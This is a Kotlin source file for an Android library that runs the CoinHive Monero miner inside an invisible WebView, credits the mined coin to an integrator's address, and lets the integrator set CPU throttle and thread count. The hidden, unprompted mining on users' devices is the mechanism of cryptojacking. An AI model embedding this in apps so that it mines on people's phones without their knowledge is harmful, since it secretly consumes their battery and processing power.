// The MIT License (MIT)
//
// Copyright (c) 2018 Smart&Soft
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package com.smartnsoft.monerominer

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient

@SuppressLint("StaticFieldLeak")
/**
 * The MoneroMiner class is a Singleton that embeds a WebView used to interpret the CoinHive Javascript Monero miner.
 * The embedded WebView is invisible to the user and cannot be displayed.
 * The integrator **must** initialize the MoneroMiner with a context and a CoinHive address from where the mined
 * Monero will be added using the initialize(Context, String) method.
 *
 * @author David Fournier
 * @since 2018.03.01
 */
object MoneroMiner
{

  /**
   * The CoinHive address from where the Monero mined will be added
   */
  var id: String? = null
    get()
    {
      if (field == null)
      {
        throw IllegalStateException("The Monero Miner must be instantiated with an ID before getting started")
      }
      return field
    }

  /**
   * The percentage of time the Monero Miner runs on each thread.
   * Default is 20%.
   * Must be set between 0 and 100.
   */
  var throttle = 20
    set(value)
    {
      if (value < 0 || value > 100)
      {
        throw IllegalArgumentException("The throttle must be comprised between 0 and 100 (% of CPU usage)")
      }
      field = value
      start()
    }

  /**
   * The number of threads (cores) the Monero Miner should run on.
   * Default is 1.
   * Must be greater than 0.
   */
  var threads = 1
    set(value)
    {
      if (value < 1)
      {
        throw IllegalArgumentException("The number of threads must be greater than 0")
      }
      field = value
      start()
    }

  private var miner: WebView? = null

  @Volatile
  private var hasFinishedLoading = false

  private var promise: (() -> Unit)? = null

  /**
   * Initializes the Monero Miner with the @id representing the CoinHive address from where the mined Monero will
   * be added.
   * This method must be called before any other method.
   */
  fun initialize(context: Context, id: String)
  {
    MoneroMiner.id = id
    miner = WebView(context)
    miner?.settings?.javaScriptEnabled = true
    miner?.addJavascriptInterface(this, "android")
    miner?.loadUrl("file:///android_asset/monero-miner.html")
    miner?.webViewClient = object : WebViewClient()
    {
      override fun onPageFinished(view: WebView?, url: String?)
      {
        hasFinishedLoading = true
        promise?.invoke()
      }
    }
  }

  /**
   * Starts the Monero Miner @throttle percent of the CPU time and on @threads.
   * Throws an exception if the Monero Miner hasn't been initialized.
   */
  fun start(throttle: Int? = null, threads: Int? = null)
  {
    throttle?.let { MoneroMiner.throttle = it }
    threads?.let { MoneroMiner.threads = it }
    start()
  }

  /**
   * Starts the Monero Miner @throttle percent of the CPU time and on @threads.
   * Throws an exception if the Monero Miner hasn't been initialized.
   */
  fun start()
  {
    checkInitialization()
    promise = null
    if (hasFinishedLoading)
    {
      miner?.loadUrl("javascript:start(\"${id}\", ${throttle}, ${threads});")
    }
    else
    {
      promise = MoneroMiner::start
    }
  }

  /**
   * Stops the Monero Miner.
   * Throws an exception if the Monero Miner hasn't been initialized.
   */
  fun stop()
  {
    checkInitialization()
    promise = null
    if (hasFinishedLoading)
    {
      miner?.loadUrl("javascript:stop();")
    }
    else
    {
      promise = MoneroMiner::stop
    }
  }

  /**
   * Logs back to Android the Javascript logs.
   * Should **NOT** be called.
   * This function is not private due to the Javascript interface, but should have been.
   */
  @JavascriptInterface
  fun log(text: String)
  {
    Log.d(MoneroMiner::class.java.simpleName, text)
  }

  private fun checkInitialization()
  {
    id = id
  }

}